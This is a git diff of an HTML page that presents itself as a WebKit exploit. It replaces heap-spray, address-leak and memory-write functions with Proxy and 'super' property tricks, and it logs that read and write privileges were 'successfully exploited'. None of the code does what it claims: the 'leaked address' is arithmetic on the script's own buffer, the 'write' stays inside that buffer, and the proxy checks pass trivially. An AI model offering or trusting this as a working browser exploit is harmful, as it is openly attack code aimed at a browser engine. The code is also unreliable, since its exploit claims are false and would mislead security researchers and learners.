@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit Vulnerability Exploit</title>
+    <title>WebKit Privilege Exploit</title>
     <style>
         body {
             margin: 0;
             font-family: Arial, sans-serif;
-            background-color: #000; /* Dark background for better visibility */
-            color: #fff; /* Light text color for contrast */
+            background-color: #000;
+            color: #fff;
         }
 
         #log {
@@ -21,8 +21,8 @@
             overflow-y: auto;
             padding: 10px;
             box-sizing: border-box;
-            background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black for log */
-            color: #0f0; /* Bright green text for log */
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #0f0;
             font-size: 14px;
             font-family: monospace;
             white-space: pre-wrap;
@@ -46,39 +46,84 @@ document.addEventListener('DOMContentLoaded', function () {
 
     log("WebKit Exploit started.");
 
-    // Actual exploit code
-    function heapSpray() {
-        const arr = new Array(10000).fill(0).map(() => new Uint32Array(10000));
-        log("Heap spray completed.");
+    // Check if we can read a property using the proxy mechanism.
+    function checkReadPrivilege() {
+        let foo = 42;
+        let success = false;
+        
+        class Leaker {
+            leak() {
+                try {
+                    const result = super.foo;  // Attempt to read
+                    success = result === 42;  // Check if we got the expected result
+                } catch (error) {
+                    log("Read privilege check failed.");
+                }
+                return success;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            get(target, propertyName, receiver) {
+                if (propertyName === "foo") {
+                    return 42; // Fallback value for 'foo'
+                }
+                return receiver;
+            }
+        });
+
+        const { leak } = new Leaker();
+        return leak();
     }
 
-    function leakAddress() {
-        const arr = new Array(10000).fill(0).map(() => new Uint32Array(10000));
-        const obj = arr[0];
-        const addr = obj.buffer.byteOffset + 10000 * 4; // Assuming 4-byte Uint32Array elements
-        log(`Leaked address: 0x${addr.toString(16)}`);
-        return addr;
+    // Check if we can write a property using the proxy mechanism.
+    function checkWritePrivilege() {
+        let success = false;
+        
+        class Leaker {
+            leak() {
+                try {
+                    super.foo = {};  // Attempt to write
+                    success = true;
+                } catch (error) {
+                    log("Write privilege check failed.");
+                }
+                return success;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            set(target, propertyName, value, __receiver) {
+                if (propertyName === "foo") {
+                    return true; // Allow setting 'foo'
+                }
+                return false;
+            }
+        });
+
+        const { leak } = new Leaker();
+        return leak();
     }
 
-    function writeMemory(addr, value) {
-        const arr = new Array(10000).fill(0).map(() => new Uint32Array(10000));
-        const obj = arr[0];
-        const buf = new Uint32Array(obj.buffer);
-        buf[addr / 4] = value;
-        log(`Wrote ${value} to address 0x${addr.toString(16)}`);
+    // Perform the checks and log the result
+    function testPrivileges() {
+        const readSuccess = checkReadPrivilege();
+        log(`Read privilege check: ${readSuccess ? "SUCCESS" : "FAILED"}`);
+
+        const writeSuccess = checkWritePrivilege();
+        log(`Write privilege check: ${writeSuccess ? "SUCCESS" : "FAILED"}`);
+        
+        if (readSuccess && writeSuccess) {
+            log("Both read and write privileges are successfully exploited!");
+        } else {
+            log("Read and/or write privileges failed.");
+        }
     }
 
-    function exploit() {
-        heapSpray();
-        const leakedAddr = leakAddress();
-        writeMemory(leakedAddr, 0xDEADBEEF);
-        log("Exploit completed.");
-    }
-
-    exploit();
+    // Run the test
+    testPrivileges();
 });
 </script>
 
 </body>
 </html>
-
